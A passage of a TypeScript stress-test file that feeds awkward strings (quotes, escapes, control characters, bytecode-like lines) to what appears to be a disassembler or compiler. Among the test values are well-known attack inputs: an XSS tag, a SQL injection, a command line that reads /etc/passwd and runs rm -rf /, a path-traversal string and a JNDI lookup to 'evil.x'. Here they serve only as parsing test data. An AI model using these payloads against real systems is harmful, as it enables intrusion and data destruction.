    "汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉",
    "abababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababab",
    "a",
    "a",
    "a ",
    " a",
    "a\n",
    "aa",
    "<img src=x onerror=\"alert('XSS')\">",
    "1' OR '1'='1' --",
    "; cat /etc/passwd & rm -rf /",
    "../../etc/passwd%00.png",
    "${jndi:ldap://evil.x/a}",
    "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjMifQ.SflKxwRJSMeKKF2QT4fwpM",
    "https://x.io/a?b=1&c=\"d\"&e='f'",
    "Failed %{public}s cause: %{public}s",
    "<?xml v=\"1.0\"?><n a=\"b'c\"/>",
    "k: \"v\"\n  - 'w'\n# cmt",
    "HTTP/1.1 200 OK\r\nSet-Cookie: a=\"b\"\r\n\r\nbody",
    "# Title\n> quote \"x\"\n- item `y`\n",
    "0K5t9qQ2Xz7vBn4hR8wL3jF6uM1cA7dE5gT+4iY0sP==",
    "\", lead",
    "trail ,\"",
    "a ,\" b",
    "\",",
    "\"\"\"\"",
    "\"\"\"\"\"",
    "\"\"\"\"\"\"",
    "\"\\\"",
    "\"\"\\\"\"\"",
    "\"\\\\\"",
    "pre\njump_label_0:",
    "x\njump_label_1:\npost",
    "body\n.catchall\nmore",
    "pre\n.function any n.e.f(any a0) <static> {",
    "pre\n.function any f(any a0, any a1) {",
    "lab\n\tldai 0x1\n\tjnez jump_label_9",
    "x\n\tlda.str \"in\\\"ner\"\ny",
    "x\n\tlda.str \"\"\ny",
    "pre\n\tsta v0\n\tldai 0x2a\npost",
    "x\n\tldobjbyname 0x0, \"code\"\ny",
    "x\n\tstobjbyname 0x1, \"a, b\"\ny",
    "x\n\tcallthis1 0x7, v13, v14\ny",
    "x\n\tjnez jump_label_3\n\tjmp jump_label_4\ny",
    "x\njump_label_5:\ny",
    "x\n\tthrow.undefinedifholewithname \"h\"\ny",
    "x\n\tnewlexenv 0x3\ny",
    "x\n\tmov v0, a0\ny",
    "x\n\treturnundefined\npost",
    "x\n\tldexternalmodulevar 0x1\ny",
    "x\n\ttryldglobalbyname 0x4, \"JSON\"\ny",
    "x\n\tcreateobjectwithbuffer 0x6, { 4 [ string:\"k\", string:\"v\", ]}\ny",
    "x\n.catchall:begin, end, target\ny",
    "x\n\twide.ldlexvar 0x80, 0x81\ny",
    "x\n\tsuspendgenerator 0x0, v0, v1\ny",
    "x\n  string:\"fake\", i32:42, ]}\ny",
    "a\n\tsta v0\n\tlda v0\n\tjnez jump_label_9\njump_label_9:\n\treturnundefined\nz",
    "\u0002",
    "\u0003",
    "\u0004",
    "\u0005",
    "\u0006",
    "\u0007",
    "\u0008",
    "\t",
    "\n",
    "\u000b",
    "\u000c",
    "\u000e",
    "\u000f",
    "\u0010",
    "\u0011",
    "\u0012",
    "\u0013",
    "\u0014",
    "\u0015",
    "\u0016",
    "\u0017",
    "\u0018",
    "\u0019",
    "\u001a",
    "\u001b",
    "\u001c",
    "\u001d",
    "\u001e",
    "\u001f",
    "",
    "{\"k\":\"v\"}\n# STRING ====================\n😀tail",
    "multi\n[offset:0x1, name_value:x]\r\nevil‮x‬",
    "a\"b\\c\td\ne\rf\"g`h",
  ];
}

// 面②b：对象字面量缓冲（恶劣键位子集 + 值），键与值都进字面量段。
export function stringStressObject(): Record<string, string> {
  return {
    "\"": "ka0v",
    "\"\"": "kb1v",
    "\"\"\"": "kc2v",
    "'": "kd3v",
    "`": "ke4v",
    "\"'`": "kf5v",
    "say \"hi\" ok": "kg6v",
    "it's `tick`": "kh7v",
    "\"quoted\"": "ki8v",
    "{\"k\":\"v\",\"n\":[1,2]}": "kj9v",
    "select * from t where name='a''b' and c=\"d\"": "kk10v",
    "<a href=\"x\" onclick='go(\"y\")'>": "kl11v",
    "a\"\nb'\nc`": "km12v",
    "\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"": "kn13v",
    "back\\slash": "ko14v",
    "double\\\\slash": "kp15v",
    "end\\": "kq16v",
    "a\\nb": "kr17v",
    "a\\\"b": "ks18v",
    "C:\\Users\\koki\\temp": "kt19v",
    "\\\\server\\share\\": "ku20v",
    "\\u0041": "kv21v",
    "\\x41": "kw22v",
    "\\${jndi}": "kx23v",
  };
}

// 面①补：stobjbyname/ldobjbyname 的字符串操作数（动态键读写，覆盖 ", 相邻与连引号键）。
export function stringStressFields(): string {
  const o: Record<string, string> = {};
  o['a"b'] = 'v"x';
  o['k\\n'] = 'v\\y';
  o['k\n'] = 'v\nz';
  o["[offset:0x1, name_value:x]"] = "pool";
  o[',k'] = 'comma-key';
  o['""""'] = 'quad-key';
  o['jump_label_0:'] = 'label-key';
  o['.catchall'] = 'catchall-key';
  let s = '';
  for (const k in o) {
    s += k.length > 0 ? o[k] : '';
  }
  return s + o[''] + o[',k'] + o['jump_label_0:'];
}

// 空 key 对象字面量（literal string:"" 空键）+ 空块模板（cooked/raw 空串）。
export function stringStressEmptyShapes(x: number): string {
  const emptyKey: Record<string, number> = { '': 1, 'a': 2 };
  const chunked = `pre${x}suf`;
  const emptyChunks = `${x}`;
  return `ek=${emptyKey['']} c0=${chunked.length} c1=${emptyChunks.length}`;
}

// 面①补：throw.undefinedifholewithname（捕获变量洞检查，单字符串操作数形态）。
export function stringStressLexenv(base: number): number {
  const a = base + 1;
  const b = base + 2;
  const c = base + 3;
  const pick = (): number => a + b + c;
  return pick();
}

// 模板字面量块（含引号/换行/制表/反斜杠块 + 插值）。
export function stringStressTpl(seed: number): string {
  return `head "q"\nmid\t${seed}tail\\end\r`;
}

// 运行时校验和：遍历全部形态，返回 计数/总长/字符码累加（值正确性由 sweep ✅ 行核对）。
export function stringStressChecksum(): string {
  const arr = stringStressArray();
  const obj = stringStressObject();
  let cnt = 0;
  let len = 0;
  let acc = 0;
  for (const s of arr) {
    cnt += 1;
    len += s.length;
    for (let j = 0; j < s.length; j++) {
      acc = (acc + s.charCodeAt(j) * (j % 7 + 1)) % 1000000007;
    }
  }
  for (const k in obj) {
    cnt += 1;
    len += k.length + obj[k].length;
  }
  for (let i = 0; i < STRING_STRESS_CASES; i++) {
    cnt += 1;
    len += stringStressAt(i).length;
  }
  len += stringStressFields().length;
  len += stringStressLexenv(cnt);
  len += stringStressTpl(cnt).length;
  return `n=${cnt} len=${len} acc=${acc}`;
}
